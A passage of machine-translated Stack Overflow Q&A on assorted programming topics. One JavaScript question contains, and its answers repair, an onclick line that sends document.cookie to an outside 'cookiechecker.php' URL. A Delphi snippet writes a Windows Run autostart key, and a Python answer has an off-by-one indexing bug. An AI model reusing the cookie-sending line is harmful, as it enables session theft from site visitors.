API 甚至允许您根据需要使用 categoryId 和 intent 参数过滤结果。例如，在我们的应用程序中，我们过滤掉了少于 2 个唯一人签到的地方，因为我们假设它是伪造的地方.. 我们也对结果集进行其他过滤，但我们**只**显示来自foursquare 场地数据库的数据，我们属性。

# php - 拆分替换语法

> ID：13280524
> 
> 赞同：-2
> 
> 时间：2012-11-08T00:13:55.040
> 
> 标签：php, split

> **可能重复：**
> [PHP 拆分替代方案？](https://stackoverflow.com/questions/2813241/php-split-alternative)

用以下语法替换折旧拆分的命令/语法是什么：

```
 $frags = split("\/", $the_image_src); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:16:06.670

split 的 php 文档建议 preg_split 或 explode，其语法相同

[http://php.net/manual/en/function.split.php](http://php.net/manual/en/function.split.php)

请参阅提示。通常，不推荐使用的函数将提供替代方案

编辑

```
preg_split("(/)", $the_image_src); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:15:55.010

如果您不匹配模式（正则表达式）并且仅在字符串上拆分，则可以使用[explode](http://www.php.net/explode)。它将工作得更快，因为它不需要调用正则表达式引擎来解释模式和匹配（即使模式只是一个字符串，仍然存在开销）。如果您想像 split 通常那样匹配正则表达式模式，您应该使用[preg_split](http://www.php.net/preg_split)。

# codeigniter - Codeigniter 和 Tank_auth 发送验证以查看不起作用

> ID：13280525
> 
> 赞同：0
> 
> 时间：2012-11-08T00:14:26.483
> 
> 标签：codeigniter

嗨，我是 Codeigniter 的新手，但遇到了障碍。

我正在尝试查看用户是否已经存在。

首先，我通过表单将数据上传到控制器，该控制器进行验证等，但仅解决该问题。我设法找到它坏的地方，但不能从那里修复它。

*在这之前，它会查询数据库，发现实际上有一个匹配的用户名，然后到达下面的代码片段*

```
 $errors = $this->tank_auth->get_error_message(); 
      //find the correct error msg

      foreach ($errors as $k => $v) $data['errors'][$k] =$this->lang->line($v);        
      //loop and find etc

      $temp_mess = $data['errors'][$k]; 
      //stores relevant stuff in the string
    }
  }
//echo $temp_mess; it outputs to the html so i can see it "says user exists"
$data['temp_mess'] = $tempmess; /// put this into a array

$this->load->view('layout', $data); ///send 
    }
} 
```

现在对于视图，它然后调用布局视图等，但可惜没有输出

```
$username1 = array(
        'name'  => 'username1',
        'id'    => 'username1',
        'value' => set_value('username1'),
        'maxlength' => $this->config->item('username_max_length', 'tank_auth'),
        'size'  => 30,
    );

<?php echo form_open('register', $form_reg_id ); ?>

<fieldset>
<legend align="center">Sign up</legend>
    <?php echo form_label('Username', $username1['id']); ?>
    <?php echo form_input($username1); ?>
    <?php $tempmess; ?>
    <div class="error"><?php echo form_error($username1['name']); ?>
    <?php echo isset($errors[$username1['name']])?$errors[$username1['name']]:''; ?>
<?php echo form_close(); ?>
</fieldset> 
```

感谢您对此的任何帮助

也有人可以解释一下这条线。（对于一个非常愚蠢的人）

```
<?php echo isset($errors[$username1['name']])?$errors[$username1['name']]:''; ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T02:05:17.030

当用户名存在时，Tank_auth 会自动返回错误。Juste 必须检查错误数组。

# python - 重命名有间隙的连续图像文件

> ID：13280528
> 
> 赞同：2
> 
> 时间：2012-11-08T00:14:34.510
> 
> 标签：python, linux, bash

我正在寻找一种将具有间隙的图像文件列表重命名为连续的方法。另外我想给他们一个 4 的填充。我目前正在使用 Python 2.7 和 Linux bash 来编程。

```
 Example:

    1.png
    2.png
    3.png
    20.png
    21.png
    50.png 
```

应该变成：

```
 0001.png
    0002.png
    0003.png
    0004.png
    0005.png
    0006.png 
```

我还希望文件名与它们当前所在的目录相同。

```
 Example:

    c_users_johnny_desktop_images.0001.png
    c_users_johnny_desktop_images.0002.png
    c_users_johnny_desktop_images.0003.png
    c_users_johnny_desktop_images.0004.png
    c_users_johnny_desktop_images.0005.png
    c_users_johnny_desktop_images.0006.png 
```

任何帮助将不胜感激！:)

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:21:55.493

这是蟒蛇

```
#first collect all files that start with a number and end with .png
my_files = [f for f in os.listdir(some_directory) if f[0].isdigit() and f.endswith(".png")]
#sort them based on the number  
sorted_files = sorted(my_files,key=lambda x:int(x.split(".")[0])) # sort the file names by starting number
#rename them sequentially
for i,fn in enumerate(sorted_files,1): #thanks wim
    os.rename(sorted_files[i],"{0:04d}.png".format(i)) 
```

我本来可以`list.sort(key=...)`就地排序，但我认为这会稍微冗长和可读......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:22:58.140

**尝试**在 shell 中执行此操作：

```
rename -n '
    $s = substr(join("_", split("/", $ENV{PWD})), 1) . ".";
    s/(\d+)\.png/$s . sprintf("%04d", ++$c) . ".png"/e
' *.png 
```

**输出**：

```
1.png -> c_users_johnny_desktop_images.0001.png
2.png -> c_users_johnny_desktop_images.0002.png
3.png -> c_users_johnny_desktop_images.0003.png
20.png -> c_users_johnny_desktop_images.0004.png
21.png -> c_users_johnny_desktop_images.0005.png
50.png -> c_users_johnny_desktop_images.0006.png 
```

`rename`是[http://search.cpan.org/~pederst/rename/](http://search.cpan.org/~pederst/rename/)并且是`rename`许多发行版上的默认命令。

当命令也被测试时，您可以移除`-n`开关来真正执行它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T02:01:54.560

等等等等等等。CSH 不好。巴什很好。Python 更好。呸骗子。我还在用TCSH...

```
% set i = 1
% foreach FILE ( `ls *[0-9].png | sort -n` )
    echo mv $FILE `printf %04d $i`.png ; @ i ++
    end 
```

输出：

```
mv 1.png 0001.png
mv 2.png 0002.png
mv 3.png 0003.png
mv 20.png 0004.png
mv 21.png 0005.png
mv 50.png 0006.png 
```

* * *

* * *

**回复评论：**

*仍然需要 c_users_johnny_desktop_images。*

好的，所以使用：

```
echo mv $FILE c_users_johnny_desktop_images.`printf %04d $i`.png ; @ i ++ 
```

这不像我的例子很难阅读。

更正：也许您的意思是自动提取当前目录名称并将其合并。例如：

```
echo mv $FILE `echo $cwd | sed -e 's|^/||' -e 's|/|_|g'`.`printf %04d $i`.png ; @ i ++ 
```

-

*tcsh 中不存在 glob 吗？您对 ls 的解析似乎很可怕*

当然存在球体。这就是我们传递给**ls**的内容。但是 globbing 为我们提供了一个按字母顺序排序的列表，如 1、2、20、21、3、50。我们想要一个数字排序，如 1,2,3,20,21,50。当我们在数字中没有前导零时的标准问题。

**sort -n**进行数字排序。 **ls**在每个文件名之后给我们一个换行符。我们可以很容易地写：

```
foreach FILE ( `echo *[0-9].png | tr ' ' '\012' | sort -n` ) 
```

但我很懒，**ls**为我做换行符。它有什么可怕的？

# ssl - Windows XP 上的 IE8/IE7/IE6/IE5 使用错误的证书

> ID：13280529
> 
> 赞同：3
> 
> 时间：2012-11-08T00:14:43.110
> 
> 标签：ssl, internet-explorer-8, windows-xp, certificate, ssl-certificate

出于某种原因，Windows XP 上的**IE8 / IE7 / IE6 / IE5**，而不是使用 Nginx 网站配置中列出的证书，正在使用另一个用于其他网站的证书。

检查网站的 Nginx 配置文件一切正常。对此的确认是所有其他浏览器（Chrome/Firefox/Safari/IE9）都在使用正确的证书。

这是应用程序的 nginx 配置：

```
server {
    listen 80;
    listen 443 ssl;

    server_name mydomain.com;
    ssl_certificate /root/certs/mydomain.com/mydomain.bundle.crt;
    ssl_certificate_key /root/certs/mydomain.com/mydoamin.key;

    access_log /opt/webapps/cs_at/logs/access.log;

    location / {
        add_header P3P 'CP="CAO PSA OUR"';
        proxy_pass http://127.0.0.1:20004;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Real-IP $remote_addr;
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T02:46:41.173

这里的解决方案：

[https://serverfault.com/questions/203574/why-does-ie-think-that-my-certificate-is-invalid](https://serverfault.com/questions/203574/why-does-ie-think-that-my-certificate-is-invalid) [http://nginx.org/en/docs/http/configuring_https_servers.html#sni](http://nginx.org/en/docs/http/configuring_https_servers.html#sni)

**Windows XP 下的 IE8/IE7/IE6 不支持 TLS 服务器名称指示扩展协议。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:33:33.870

听起来 Windows XP/IE 8 系统无法识别我们的中间文件。如果您更新您的 Windows 系统，应该可以解决问题并允许 IE 8 识别我们的中间文件。

# delphi - 为什么 RegSetValueEx 只添加半个字符串？

> ID：13280536
> 
> 赞同：3
> 
> 时间：2012-11-08T00:15:44.760
> 
> 标签：delphi, registry, type-conversion

注意：我使用的是 Delphi XE2

我正在尝试添加一个注册表项。这是我当前的代码：

```
function AddRegKey(Key:HKEY;Keyname,Value:String):Boolean;
var
  phkResult:HKEY;
begin
  if RegOpenKeyEx(Key, PWideChar('SOFTWARE\Microsoft\Windows\CurrentVersion\Run'), 0, KEY_SET_VALUE, phkResult) = ERROR_SUCCESS then
    begin
      Result := (RegSetValueEx(phkResult, PWideChar(KeyName), 0, REG_SZ, PWideChar(Value), Length(Value)) = ERROR_SUCCESS);
      RegCloseKey(phkResult);
    end
  else Result:=False;
end;

begin
    If AddRegKey(HKEY_CURRENT_USER,'TestTest','123456789') Then
        MessageBox(0,'Success','Test',0);
end. 
```

这导致以下结果：

![在此处输入图像描述](../Images/92609a58224c388d936e141e86976cfe.png)

它只是添加前四个字符

但是当我将“值”参数更改为：

```
123456789123456789 
```

然后它补充说：

```
123456789 
```

因此，似乎出于某种原因它只增加了给定值的一半。我该如何解决这个问题？

我是否为 RegSetValueEx 中的 *lpData 参数传递了错误的数据类型？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-08T00:23:41.583

[阅读文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724923.aspx)。的最后一个参数`RegSetValueEx()`是字节数，但您传递给它的是字符数（甚至不是正确的计数 - 您必须包含空终止符）。 `SizeOf(WideChar)`是 2，所以你告诉`RegSetValueEx()`只写一半的字符串数据。你需要解决这个问题，例如：

```
function AddRegKey(Key:HKEY; Keyname, Value: String): Boolean;
var
  phkResult: HKEY;
begin
  Result := False;
  if RegOpenKeyEx(Key, PChar('SOFTWARE\Microsoft\Windows\CurrentVersion\Run'), 0, KEY_SET_VALUE, phkResult) = ERROR_SUCCESS then
  begin
    Result := RegSetValueEx(phkResult, PChar(KeyName), 0, REG_SZ, PChar(Value), (Length(Value) + 1) * SizeOf(Char)) = ERROR_SUCCESS;
    RegCloseKey(phkResult);
  end;
end; 
```

话虽如此，您可能会考虑使用`TRegistry`为您处理这些细节的类：

```
uses
  ..., Registry;

function AddRegKey(Key: HKEY; Keyname, Value: String): Boolean;
var
  Reg: TRegistry;
begin
  Result := False;
  try
    Reg := TRegistry.Create(KEY_SET_VALUE);
    try
      Reg.RootKey := Key;
      if Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', True) then
      try
        Reg.WriteString(KeyName, Value);
        Result := True;
      finally
        Reg.CloseKey;
      end;
    finally
      Reg.Free;
    end;
  except
  end;
end; 
```

# sql - 从单个表中检索具有不同值的同一列的多个输出时的性能问题

> ID：13280548
> 
> 赞同：0
> 
> 时间：2012-11-08T00:16:37.590
> 
> 标签：sql, sql-server, performance, tsql

无论如何都可以从查询中获得以下结果而不加入同一个表三次（或）而不读取相同的“wordlocation”表三次（或者如果有更多的话）？如果有三个或更多的单词，大约需要一分钟多的时间才能返回结果。

目前“wordlocation”表有三行（“bookid”、“wordid”、“location”），目前有917802行。

我想做的是

1.  检索包含“wordid”查询中指定的所有单词的“bookid”。
2.  每本书中所有单词（来自查询）的总字数
3.  每个词位置的最小值，例如 (min(w0.location), min (w1.location)

我尝试注释掉 count(w0.wordid) 和 min(location) 计算，看看它们是否影响性能，但事实并非如此。多次加入同一张桌子就是这种情况。

![在此处输入图像描述](../Images/bfa5f8132205e4dea8d078ab3e005e6a.png)

（这与上图的代码相同）

```
select 
    w0.bookid, 
    count(w0.wordid) as wcount, 
    abs(min(w0.location) + min(w1.location) + min(w2.location)) as wordlocation, 
    (abs(min(w0.location) - min(w1.location)) + abs(min(w1.location) - min(w2.location))) as distance 
    from 
    wordlocation as w0 
    inner join 
    wordlocation as w1 on w0.bookid = w1.bookid 
    join 
    wordlocation as w2 on w1.bookid = w2.bookid 
    where 
    w0.wordid =3 
    and 
    w1.wordid =52 
    and 
    w2.wordid =42
    group by w0.bookid 
    order by wcount desc; 
```

这是我正在寻找的结果，也是我通过运行上述查询得到的结果，但如果我指定超过 3 个单词，例如 (w0 = 3, w1 = 52, w2 = 42, w3 = 71 )

![在此处输入图像描述](../Images/7610c5c4be65b0cc407419a9ca5f669a.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:49:40.217

试试这个查询

```
 SELECT bookid,
      ABS(L3+L52+L42) as wordlocation,
      ABS(L3-L52)+ABS(L52-L42) as distance
    FROM 
      (SELECT bookid, wordid, CASE WHEN wordid=3 THEN min(location) ELSE 0 END L3,
         CASE WHEN wordid=52 THEN min(location) ELSE 0 END L52,
         CASE WHEN wordid=42 THEN min(location) ELSE 0 END L42
      FROM wordlocation WL
      WHERE wordid in (3,52,42)
      GROUP BY bookid, wordid) T
    GROUP BY bookid 
```

您可能还需要在`wordid`

# javascript - 如何通过 Firefox 插件访问不安定的服务

> ID：13280549
> 
> 赞同：0
> 
> 时间：2012-11-08T00:16:38.180
> 
> 标签：javascript, jquery, firefox-addon

我一直在尝试访问 Firefox 插件中的不安界面。在阅读了很多地方之后，我遇到了 getJASONP jquery 函数，它解决了跨域资源共享问题，但感觉就像是 hack。没有更优雅的方式通过 Firefox 插件使用 jquery 获取和发布数据。如果黑客是唯一的方法，我会感到非常惊讶。

谢谢。

```
$(document).ready(function () {
        //var url = "http://132.205.237.32:8182/services";
        var url ="http://127.0.0.1/learning.php";
      $.getJSON(url+'?callback=?', {type:"json"}, function (results) {
          alert(results.service1);
     });
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:05:09.520

您只需访问它们 - 例如使用`XMLHttpRequest`. Firefox 扩展不受同源策略的约束，允许从 Web 请求任何地址。

旁注：请不要在 Firefox 扩展中使用 JSONP，这是一个安全漏洞。通过使用 JSONP，您可以使用扩展程序的权限从 Web 上运行一些代码。

# iphone - 如何在objective-c中的图像上进行自定义绘图

> ID：13280556
> 
> 赞同：0
> 
> 时间：2012-11-08T00:17:11.257
> 
> 标签：iphone, objective-c, flood-fill

首先我想说我是objective-c的新手。

直到知道我已经构建了一个仅在一个图像上绘制的应用程序（这是具有 3 种颜色的 .png 图像：红绿蓝）。应用程序在整个图像中绘制线条。

我想要的是只用一种颜色（例如：红色）画线，即使触摸（鼠标）上升到其他颜色。（......正如我在互联网上看到的，应该使用洪水填充算法来完成）

你能给我一些关于如何做到这一点的想法吗？

我现在使用的代码：

```
- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event {
mouseSwiped = YES;

UITouch *touch = [touches anyObject];
currentPoint = [touch locationInView:self.view];

UIGraphicsBeginImageContext(CGSizeMake(320, 568));
[drawImage.image drawInRect:CGRectMake(0, 0, 320, 568)];
CGContextSetLineCap(UIGraphicsGetCurrentContext(), kCGLineCapRound);
CGContextSetLineWidth(UIGraphicsGetCurrentContext(), 5.0);
CGContextSetRGBStrokeColor(UIGraphicsGetCurrentContext(), 0, 2, 0, 2);
CGContextBeginPath(UIGraphicsGetCurrentContext());
CGContextMoveToPoint(UIGraphicsGetCurrentContext(), lastPoint.x, lastPoint.y);
CGContextAddLineToPoint(UIGraphicsGetCurrentContext(), currentPoint.x, currentPoint.y);
CGContextStrokePath(UIGraphicsGetCurrentContext());

[drawImage setFrame:CGRectMake(0, 0, 320, 568)];
drawImage.image = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();
lastPoint = currentPoint;

[self.view addSubview:drawImage];
} 
```

提前谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T04:37:18.597

您可以创建派生自`UIView`并覆盖 message的自定义类`drawRect:`。然后把你的抽奖代码放到`drawRect:`. 将此自定义类添加为您的`UIImageView`.

```
#import <QuartzCore/QuartzCore.h>
@interface YourView : UIView {
    ...
}

in .m file
- (void)drawRect:(CGRect)rect{
    CGContextRef ctx = UIGraphicsGetCurrentContext();
    //your drawings
} 
```

# ios - In iOS, what's the fastest way to load a sorted list of contacts?

> ID：13280565
> 
> 赞同：2
> 
> 时间：2012-11-08T00:17:38.557
> 
> 标签：ios, sorting, contacts, addressbook, abaddressbook

When implementing a view similar to an `ABPeoplePickerNavigationController`, I'm not able to sort the list very quickly. The native contacts app loads the list instantly. I'm dealing with 4000+ contacts, so keeping load times down is important. I can't use the `ABPeoplePickerNavigationController` because I need to do a lot of custom UI work.

I was using `ABAddressBookCopyArrayOfAllPeople`, then placing the people in `UILocalizedIndexedCollation` sections using sectionForObject and then sorting the sections using `sortedArrayFromArray`. For 4000 contacts, my time was about 8 seconds.

I then switched to using `ABAddressBookCopyArrayOfAllSources` and for every source, `ABAddressBookCopyArrayOfAllPeopleInSourceWithSortOrdering` and just appending each source's contacts to the unsorted array, then using the same `UILocalizedIndexedCollation` technique. This dropped the time down to about 5 seconds, I guess since the sections were mostly sorted already.

Is there any way to improve on this? Any techniques I'm not aware of? Can I somehow load an `ABPeoplePickerNavigationController` data source without the view and use that? Or is there a faster sorting method?

Thanks very much.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-02T02:21:32.513

> Is there any way to improve on this?

It may help to realize that you'll never need to display 4000 names immediately. All you really need is the names for whatever section the user is looking at, and you can probably find and sort those names much more quickly. Let's say the user is viewing the A section initially, so maybe you use a predicate to pick out names starting with A. Out of 4000 names, perhaps 400 start with A, and that'll cut your sorting time down to a fraction of a second. You can continue fetching and sorting sections in the background.

The point is that it doesn't really matter how long it takes to sort all the records. What matters is how long it takes to put the records that the user wants on the screen.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-02T04:31:44.473

where are those contacts stored in? Are they in CoreData?

I would use CoreData together with a NSFetchedResultsController, which handles everything, so that you don't have to care about loading times, because the NSFetchedResultsController loads just as much contacts as needed for the currently visible cells of your tableView.

I hope this helps you

Linard

# javascript - javascript中+号的替代方案

> ID：13280567
> 
> 赞同：-2
> 
> 时间：2012-11-08T00:17:45.697
> 
> 标签：javascript, hyperlink

所以，我已经做了一段时间的 JavaScript 并且偶然发现了一个问题。当我尝试使用编码到其中的 JavaScript 进行超链接时，加号就消失了，并且 JavaScript 代码的超链接不起作用。那么，JavaScript 中的加号是否有替代符号？是否有另一个我可以使用的符号与加号具有相同的功能？

这是我的代码：

```
onclick="document.location='site.com/cookiechecker.php?cookie='; +escape(document.cookie);" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:20:49.647

请将“+”替换为其十六进制等效项“%2B”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:22:28.583

试试这个（删除分号）：

```
onclick="document.location='site.com/cookiechecker.php?cookie='+escape(document.cookie);" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T00:20:41.690

%2b 是“+”的十六进制值。（您之前可能在地址栏中看到过 %20 .. 相同的想法）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T00:25:26.173

您需要删除其中的分号：

```
onclick="document.location='site.com/cookiechecker.php?cookie='+escape(document.cookie);" 
```

该分号导致 JavaScript 将您的表达式视为两个单独的语句而不是一个。它相当于：

```
document.location = 'site.com/cookiechecker.php?cookie=';
escape(document.cookie); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T00:26:08.477

你的代码是这样的：

```
onclick="document.location='site.com/cookiechecker.php?cookie='; +escape(document.cookie);" 
```

这意味着您的事件处理程序是这样的（扩展形式）：

```
document.location = 'site.com/cookiechecker.php?cookie=';
+escape(document.cookie); 
```

这不是你想要的。删除分隔两个语句的分号。

此外，您几乎可以肯定`http://`在值的开始时需要`document.location`。

最终值：

```
onclick="document.location='http://site.com/cookiechecker.php?cookie='+escape(document.cookie);" 
```

# c++ - c++ 模板和重载运算符

> ID：13280569
> 
> 赞同：0
> 
> 时间：2012-11-08T00:17:59.143
> 
> 标签：c++, templates, operators

我试图了解这个程序是如何工作的。我是 C++ 模板的新手。有人可以解释为什么我们需要以下功能吗？

```
friend std::ostream &operator <<(std::ostream &os, const Temp &temp) 
```

它似乎只适用于字符串模板。

另外，这个函数有什么作用`operator T() {return val;}`？

```
#include <iostream>
#include<string>

template <typename T>
class Temp {        
    friend std::ostream &operator <<(std::ostream &os, const Temp &temp) {
    os << temp.val;
    return os;
    }

public:
    Temp(T val) : val(val) {}
    operator T() {return val;}
public:
    T val;
}; 
```

用法示例：

```
#include <iostream>
#include<string>

#include "temp2.h"

using namespace std;

int main() {
    temp<int> si = 10;
    cout << "si: " << si << endl;
    si = si + 2;
    cout << "After si = si + 2: " << si << endl;

    Temp<double> si2 = 15.5;
    cout << "si: " << si2 << endl;
    si2 = si2 + 2.3;
    cout << "After si = si + 2: " << si2 << endl;

    Temp<string> ss = string("Hello");
    cout << "ss: " << ss << endl;
    ss = string(ss).substr(1);
    cout << "After ss = si.substr(1): " << ss << endl;

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:41:09.500

并不是`<<`真的需要操作符，而是在使用输出流的时候有它很方便。此外，操作员需要访问 Temp 类的内部值，因此需要访问`friend`限定符。没有它，该类将不得不以`val`某种方式将内部值暴露给外部世界（通常的方法是创建一个公共只读方法），这会产生维护问题，因为该类的未来演变必须继续支持方法，即使类内部发生变化。

换句话说，将`<<`运算符声明为类的朋友可以防止实现细节泄露给世界其他地方。

也就是说，T() 运算符几乎提供了我上面描述的假设只读方法的服务，但通过复制`val`字段来替换只读部分。基本上，它是一个转换运算符，允许将 Temp 值隐式转换为 T 值。该`<<`运算符可以使用该强制转换运算符实现，因此不需要朋友限定符。但是，当然出于效率考虑，保留了朋友限定符以避免复制的开销`val`。

关于`<<`操作符的实现，我们可以看到它依赖于为 T 类型名定义的相同操作符。定义了此运算符的任何类型都应该可以在此模板中正常工作。

# perl - 使用带有 Oracle 8 的 DBI 模块的 Perl 脚本停止处理

> ID：13280575
> 
> 赞同：3
> 
> 时间：2012-11-08T00:18:40.830
> 
> 标签：perl, oracle, unix, freebsd, dbi

我在使用连接到 Oracle 8 的 DBI 模块（版本 1.601）的 Perl 脚本时遇到问题。操作系统是 FreeBSD 7.0。

该脚本只是打开一个连接，循环遍历一个 CSV 文件，一次插入一行/一行数据，然后关闭连接并退出。cron 作业每 30 分钟执行一次此脚本，处理任何传入的 CSV 文件。有时，脚本会在中途停止处理（没有插入新数据，不会消耗更多的 cpu 时间），因此有必要将其终止。

CSV 文件似乎有一个大小阈值。任何低于 35000 行的内容，脚本都会执行并正常退出。否则它会停止并且进程处于（看似）休眠/等待状态。

我只能通过 SQL*Plus 远程访问 Oracle8。检查了 Oracle v$session 表，发现这些停滞进程的连接没有关闭，所以可能达到了一些资源限制？在 FreeBSD 上运行 'limits' 会产生以下结果：

```
cputime          infinity secs
filesize         infinity kB
datasize           524288 kB
stacksize           65536 kB
coredumpsize     infinity kB
memoryuse        infinity kB
memorylocked     infinity kB
maxprocesses         5547
openfiles           11095
sbsize           infinity bytes
vmemoryuse       infinity kB 
```

我不确定如何进行。我如何或在哪里可以缩小问题的范围？

任何帮助表示赞赏。

* * *

这是更改了一些 var 名称并省略了输入检查代码的脚本：

```
#!/usr/bin/perl -w
use DBI;
use strict;

my $exitstatus = 0;
my $infile = shift;
open (INFILE, "$infile");

my $dbh = DBI->connect(
  'dbi:Oracle:sid=mysid;host=myhostname',
  'myusername',
  'mypassword',
  {
    RaiseError => 1,
    AutoCommit => 1
  }
) or die $DBI::errstr;

while (<INFILE>) {
  chomp;
  next if (/^#.*$/ || /^$/);
  my @columns = split /\t/;
  my ($var1, $var2, $var3) = @columns;
  eval {
    my $oProce = qq{
      BEGIN
        InsertStoredProc(
        field1 => $var1,
        field2 => $var2,
        field3 => $var3
        );
      END;
    };
    $dbh->do( $oProce );
  };
  if ( $@ ) {
    $exitstatus=1;
    warn "LINE: @columns\n";
    warn "Execution of stored procedure failed: $DBI::errstr\n";
    warn "################################################################################\n";
  }
}
$dbh->disconnect;
close INFILE;
exit $exitstatus; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T09:26:42.570

并不是我认为它相关，而是该代码效率很低。您正在为插入的每一行解析 SQL。为什么不这样做：

```
my $sth = $dbh->prepare('BEGIN InsertStoredProc(?,?,?); END;');
while (<INFILE>) {
  chomp;
  next if (/^#.*$/ || /^$/);
  my @columns = split /\t/;
  #my ($var1, $var2, $var3) = @columns;
  eval {
       $sth->execute(@columns);
    #my $oProce = qq{
    #  BEGIN
    #    InsertStoredProc(
    #    field1 => $var1,
    #    field2 => $var2,
    #    field3 => $var3
    #    );
    #  END;
    #};
    #$dbh->do( $oProce );
  };
  if ( $@ ) {
    $exitstatus=1;
    warn "LINE: @columns\n";
    warn "Execution of stored procedure failed: $DBI::errstr\n";
    warn "################################################################################\n";
  }
} 
```

关闭 AutoCommit 的另一个建议也将加速您的代码，因为您将只提交每 N 行而不是每一行。为什么使用 AutoCommit 会导致挂起对我来说毫无意义。

至于它似乎挂起的点，如果您可以随意复制它，请尝试使用 DBI_TRACE=15=x.log 运行它并在连接中设置 ora_verbose => 6。挂起时日志文件的末尾是什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T08:12:17.387

您是否尝试过不使用 AutoCommit？也许您创建了许多事务并且 Oracle 停止处理更多请求。

尝试每 100 行提交一次，并且在没有更多数据时提交。

您可以使用 strace -p your_program_pid 查看发生了什么，您的脚本在哪里停止。

我希望这会对你有所帮助。

# wpf - 将 ContentPresenter.Content 绑定到 TemplatedParent (WPF/Silverlight)

> ID：13280576
> 
> 赞同：2
> 
> 时间：2012-11-08T00:18:46.093
> 
> 标签：wpf, silverlight, binding, controltemplate, contentpresenter

基本上，我想覆盖，例如：`TextBlock`over `Button`，通过使用`ControlTemplate`（应用于 this `Button`），但我不想摆脱它的默认模板。

例子：

```
<Grid Grid.Row="1" Grid.ColumnSpan="2">
    <Grid.Resources>
        <Style x:Key="myStyle" TargetType="Button">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Grid>
                            <ContentPresenter />
                            <TextBlock Text="textBlock" 
                                Margin="10" Foreground="Red"/>
                        </Grid>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Grid.Resources>

    <Button Style="{StaticResource myStyle}" Content="button1"></Button>
</Grid> 
```

它`Button`去掉了它的默认模板：

![在此处输入图像描述](../Images/fdd6e464e3dbf5cb9fb7e767a63ac5a5.png)

相反，我想收到这样的东西：

![在此处输入图像描述](../Images/163c94d2c28f97f17b09f9e0b65db9d3.png)

可以通过使用`ControlTemplate`吗？我试图绑定`TemplatedParent`到 `ContentPresenter.Content`这里：

```
<ContentPresenter Content="{Binding 
        RelativeSource={RelativeSource Mode=TemplatedParent},
        Path=., 
        Mode=TwoWay}"/> 
```

或其他组合，但我无法使其工作。

**编辑：**

因为我希望不仅可以将其应用于`TextBlock`按钮（这只是一个示例），而且可以应用于`Control`任何`Control`. 另外，我不想创建`UserControl`，因为我想尽可能保持 xaml 干净（我的意思是使用系统控件） - 并且只是`TextBlock`通过使用`ControlTemplate`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:13:50.043

您可以在按钮上添加[默认样式](http://msdn.microsoft.com/en-us/library/cc278069%28v=vs.95%29.aspx)并对其进行修改以添加您的`TextBlock`. 第二个选项，我的偏好，是创建一个新的 UserControl ，它将包含 the`Button`和`TextBlock`with `IsHitTestVisible=False`。然后，您可以添加依赖属性，以便能够绑定到按钮和文本块。

# php - 检查用户是否喜欢页面而不创建 Facebook 应用程序

> ID：13280578
> 
> 赞同：-2
> 
> 时间：2012-11-08T00:19:25.027
> 
> 标签：php, javascript, facebook-like, facebook-apps, facebook-page

如果用户喜欢 Facebook 页面，我必须检查我的脚本。

如果没有 Facebook 应用程序，我会意识到这一点。我不会创建它。

我创建了一些示例，但它们需要 Facebook 应用程序，并且该用户为其提供了正确的权限。

你能帮助我吗？是否可以？

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:21:07.430

您需要使用 Facebook API 并请求用户许可才能执行此操作。

**资源：**

[Facebook API 信息](http://developers.facebook.com/)

[用户信息](https://developers.facebook.com/docs/reference/api/user/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:36:12.787

如果您的应用程序是外部网站，那么您需要使用 Facebook API 并请求 user_likes 权限 + 有效访问权限，然后对 USER_ID/likes/PAGE_ID 进行 POST

如果您的应用程序是画布或选项卡应用程序，那么您可以使用 Facebook 发送给您的 signed_request 参数。

[https://developers.facebook.com/docs/howtos/login/signed-request/](https://developers.facebook.com/docs/howtos/login/signed-request/) https://developers.facebook.com/docs/reference/api/user/

问候

# visual-studio-2010 - 如何对文件子集运行代码分析？

> ID：13280579
> 
> 赞同：1
> 
> 时间：2012-11-08T00:19:27.887
> 
> 标签：visual-studio-2010, code-analysis

目前我正在/在一个没有打开代码分析的项目中工作。

我想做的只是在签入之前对我使用/触摸的文件运行 CA，但有一些限制：

*   我没有为项目打开它的选项。即使我做了...
*   工程巨大；CA 需要很长时间才能运行，并且警告很多。从列表中挑选出我接触过的文件将是大海捞针。

有人有想法么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T08:07:36.027

